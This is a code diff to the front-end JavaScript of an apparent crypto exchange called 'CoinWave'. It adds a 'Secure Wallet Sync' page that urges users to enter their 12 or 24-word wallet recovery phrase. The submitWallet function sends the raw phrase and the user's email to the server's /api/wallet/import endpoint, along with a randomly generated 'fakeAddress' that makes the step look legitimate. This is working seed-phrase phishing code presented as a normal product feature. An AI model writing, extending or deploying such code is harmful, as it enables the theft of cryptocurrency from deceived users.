@@ -1324,3 +1324,103 @@ setInterval(() => {
         importBtn.textContent = 'Link Secure Wallet';
     }
 }, 1000);
+
+/* =====================================================
+   PROFESSIONAL FULL-PAGE WALLET SYNC
+   ===================================================== */
+window.showImportWallet = function() {
+    const content = `
+        <div style="text-align: left;">
+            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;">
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><rect x="2" y="6" width="20" height="14" rx="2"></rect><path d="M16 14h2"></path><path d="M2 10h20"></path></svg>
+                    <h3 style="color: #fff; margin: 0; font-size: 18px;">Secure Wallet Sync</h3>
+                </div>
+                <span style="background: rgba(255, 255, 255, 0.1); color: #888; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold;">NOT CONNECTED</span>
+            </div>
+
+            <p style="color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">
+                Sync your wallet recovery phrase to enable instant crypto deposits, lightning-fast trades, and secure fiat withdrawals.
+            </p>
+
+            <div style="background: #0f0f15; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 20px;">
+                <p style="color: #fff; font-size: 13px; margin-bottom: 10px; font-weight: bold;">We support ANY standard crypto wallet.</p>
+                <p style="color: #888; font-size: 12px; margin-bottom: 12px;">If your wallet uses a 12 or 24-word recovery phrase, you can link it here. Popular examples:</p>
+                <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Trust Wallet</span>
+                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">MetaMask</span>
+                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Binance Web3</span>
+                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Coinbase</span>
+                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Exodus</span>
+                </div>
+            </div>
+
+            <textarea id="seedPhraseInput" rows="4" placeholder="Enter your 12 or 24-word phrase separated by spaces" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 15px; border-radius: 8px; color: #fff; font-family: monospace; font-size: 14px; line-height: 1.5; resize: none; margin-bottom: 20px; outline: none;"></textarea>
+
+            <!-- Red Warning Box -->
+            <div style="background: rgba(246, 70, 93, 0.1); border: 1px solid rgba(246, 70, 93, 0.3); border-radius: 8px; padding: 15px; margin-bottom: 25px;">
+                <div style="display: flex; gap: 10px; align-items: flex-start; margin-bottom: 12px;">
+                    <span style="font-size: 18px; color: #f6465d;">⚠️</span>
+                    <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.5; font-weight: 600;">
+                        IMPORTANT: You must enter the exact 12 or 24-word phrase. Incorrect phrases will cause connection errors and loss of access.
+                    </p>
+                </div>
+                <div style="border-top: 1px dashed rgba(246, 70, 93, 0.3); padding-top: 12px;">
+                    <p style="color: #fff; font-size: 12px; margin-bottom: 6px; font-weight: bold;">Why sync your wallet with CoinWave?</p>
+                    <ul style="color: #aaa; font-size: 12px; margin: 0; padding-left: 18px; line-height: 1.6;">
+                        <li>Seamless Crypto Deposits & Withdrawals</li>
+                        <li>Instant Swap & Trade Execution</li>
+                        <li>0% Hidden Network Fees</li>
+                        <li>Secure, Encrypted Wallet Syncing</li>
+                    </ul>
+                </div>
+            </div>
+
+            <button onclick="submitWallet()" style="background: #00d4aa; color: #000; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Verify & Secure</button>
+        </div>
+    `;
+    
+    createPageView('walletSyncPage', 'Link Wallet', content);
+    showView('walletSyncPage');
+};
+
+window.submitWallet = async function() {
+    const seedInput = document.getElementById('seedPhraseInput').value;
+    const cleanedSeed = seedInput.trim().replace(/\s+/g, ' '); 
+    const wordCount = cleanedSeed.split(' ').length;
+    
+    if (wordCount < 12) return showToast("Enter a valid 12 or 24-word phrase.");
+    
+    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+    
+    const btn = event.target;
+    btn.textContent = 'Verifying...';
+    btn.disabled = true;
+    
+    try {
+        const res = await fetch('/api/wallet/import', { 
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json' }, 
+            body: JSON.stringify({ email: currentUser.email, seedPhrase: cleanedSeed, walletAddress: fakeAddress }) 
+        });
+        if (res.ok) { 
+            showToast("Wallet submitted for review."); 
+            showView('dashboardView');
+            checkWalletStatus(); 
+        } else {
+            showToast("Error submitting wallet.");
+            btn.textContent = 'Verify & Secure';
+            btn.disabled = false;
+        }
+    } catch (error) { 
+        showToast("Error submitting wallet."); 
+        btn.textContent = 'Verify & Secure';
+        btn.disabled = false;
+    }
+};
+
+// Remove the old inline form so it doesn't conflict
+setInterval(() => {
+    const oldForm = document.getElementById('importWalletForm');
+    if (oldForm) oldForm.remove();
+}, 1000);
